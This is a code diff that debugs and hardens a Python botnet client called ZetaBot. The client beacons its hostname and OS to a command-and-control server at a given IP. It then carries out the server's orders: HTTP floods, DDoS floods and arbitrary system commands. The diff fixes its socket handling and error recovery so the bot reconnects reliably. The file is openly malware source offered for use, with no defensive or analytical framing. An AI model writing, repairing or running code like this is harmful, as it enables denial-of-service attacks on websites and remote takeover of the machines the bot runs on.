@@ -16,6 +16,7 @@ class ZetaBot:
         self.server_port = server_port
         self.bot_id = platform.node() or "unknown"
         self.running = True
+        self.sock = None  # Initialize as None
         
     def connect(self):
         """Connect to the mothership"""
@@ -28,23 +29,29 @@ class ZetaBot:
             print(f"[DEBUG] Resolved to: {resolved_ip}")
         except Exception as e:
             print(f"[DEBUG] DNS Resolution failed: {e}")
+            input("Press Enter to exit...")
             return
         
         while self.running:
             try:
                 print(f"[DEBUG] Creating socket...")
-                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.socket.settimeout(10)  # 10 second timeout
+                # Create NEW socket each attempt
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.settimeout(10)
                 
                 print(f"[DEBUG] Connecting...")
-                self.socket.connect((self.server_host, self.server_port))
+                self.sock.connect((self.server_host, self.server_port))
                 print(f"[+] Connected to Zeta C&C at {self.server_host}:{self.server_port}")
                 
                 # Send initial beacon
-                self.send_beacon()
-                
-                # Listen for commands
-                self.listen_for_commands()
+                if self.send_beacon():
+                    # Listen for commands
+                    self.listen_for_commands()
+                else:
+                    print("[DEBUG] Failed to send beacon, retrying...")
+                    self.sock.close()
+                    time.sleep(5)
+                    continue
                 
             except socket.timeout:
                 print(f"[!] Connection timeout - C&C not responding?")
@@ -57,7 +64,7 @@ class ZetaBot:
                 break
         
         print("[DEBUG] Connection loop ended")
-        input("Press Enter to exit...")  # Keep window open to see errors
+        input("Press Enter to exit...")
     
     def send_beacon(self):
         """Let the server know we're alive"""
@@ -65,19 +72,22 @@ class ZetaBot:
             beacon = {
                 'bot_id': self.bot_id,
                 'os': platform.system(),
-                'status': 'online'
+                'status': 'online',
+                'hostname': socket.gethostname()
             }
-            self.socket.send(json.dumps(beacon).encode('utf-8'))
+            self.sock.send(json.dumps(beacon).encode('utf-8'))
             print(f"[DEBUG] Beacon sent: {beacon}")
+            return True
         except Exception as e:
             print(f"[DEBUG] Failed to send beacon: {e}")
+            return False
     
     def listen_for_commands(self):
         """Wait for orders from the boss"""
         print("[DEBUG] Listening for commands...")
-        while self.running:
+        while self.running and self.sock:
             try:
-                data = self.socket.recv(4096).decode('utf-8')
+                data = self.sock.recv(4096).decode('utf-8')
                 if not data:
                     print("[DEBUG] Connection closed by server")
                     break
@@ -88,31 +98,39 @@ class ZetaBot:
                 
             except json.JSONDecodeError as e:
                 print(f"[DEBUG] Invalid JSON received: {e}")
+            except socket.timeout:
+                # Timeout is fine, just continue listening
+                continue
             except Exception as e:
                 print(f"[DEBUG] Error in listen loop: {e}")
                 break
         
-        self.socket.close()
+        if self.sock:
+            self.sock.close()
+            self.sock = None
     
     def execute_command(self, command):
         """Execute whatever fucked up shit Alpha wants"""
         action = command.get('action')
         print(f"[DEBUG] Executing action: {action}")
         
-        if action == 'http_flood':
-            self.http_flood(
-                command.get('url'),
-                command.get('threads', 10),
-                command.get('duration', 60)
-            )
-        elif action == 'ddos':
-            self.ddos_attack(command.get('target'), command.get('duration', 60))
-        elif action == 'exec':
-            self.exec_system_command(command.get('command'))
-        elif action == 'ping':
-            self.send_beacon()
-        else:
-            print(f"[DEBUG] Unknown action: {action}")
+        try:
+            if action == 'http_flood':
+                self.http_flood(
+                    command.get('url'),
+                    command.get('threads', 10),
+                    command.get('duration', 60)
+                )
+            elif action == 'ddos':
+                self.ddos_attack(command.get('target'), command.get('duration', 60))
+            elif action == 'exec':
+                self.exec_system_command(command.get('command'))
+            elif action == 'ping':
+                self.send_beacon()
+            else:
+                print(f"[DEBUG] Unknown action: {action}")
+        except Exception as e:
+            print(f"[DEBUG] Error executing {action}: {e}")
     
     def http_flood(self, url, threads=10, duration=60):
         """Mass refresh a website - HTTP flood attack"""
@@ -171,7 +189,8 @@ class ZetaBot:
             'action': 'http_flood'
         }
         try:
-            self.socket.send(json.dumps(result).encode('utf-8'))
+            if self.sock:
+                self.sock.send(json.dumps(result).encode('utf-8'))
         except:
             pass
     
@@ -208,6 +227,9 @@ class ZetaBot:
                     packets_sent += 1
                     bytes_sent += sent
                     
+                    if packets_sent % 100 == 0:
+                        print(f"[*] Sent {packets_sent} packets")
+                    
                 except Exception as e:
                     pass
                     
@@ -238,16 +260,19 @@ class ZetaBot:
             }
             
             # Send result back to server
-            self.socket.send(json.dumps(result).encode('utf-8'))
+            if self.sock:
+                self.sock.send(json.dumps(result).encode('utf-8'))
             
         except Exception as e:
             error_result = {'status': 'error', 'error': str(e)}
-            self.socket.send(json.dumps(error_result).encode('utf-8'))
+            if self.sock:
+                self.sock.send(json.dumps(error_result).encode('utf-8'))
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
         print("Usage: python bot.py <C&C_SERVER_IP>")
         print("Example: python bot.py 37.114.37.146")
+        input("Press Enter to exit...")
         sys.exit(1)
     
     print("""
@@ -257,9 +282,17 @@ if __name__ == "__main__":
     ║╔═╗║║╔══╝  ║║  
     ║║ ║║║╚══╗  ║║  
     ╚╝ ╚╝╚═══╝  ╚╝  
-    ZETA BOT CLIENT - DEBUG MODE 🔍
+    ZETA BOT CLIENT - FIXED VERSION 🔧
     """)
     
     print(f"[DEBUG] Starting bot with server: {sys.argv[1]}")
-    bot = ZetaBot(sys.argv[1])
-    bot.connect()
+    print(f"[DEBUG] Python version: {sys.version}")
+    
+    try:
+        bot = ZetaBot(sys.argv[1])
+        bot.connect()
+    except Exception as e:
+        print(f"[CRITICAL] Unhandled exception: {e}")
+        import traceback
+        traceback.print_exc()
+        input("Press Enter to exit...")
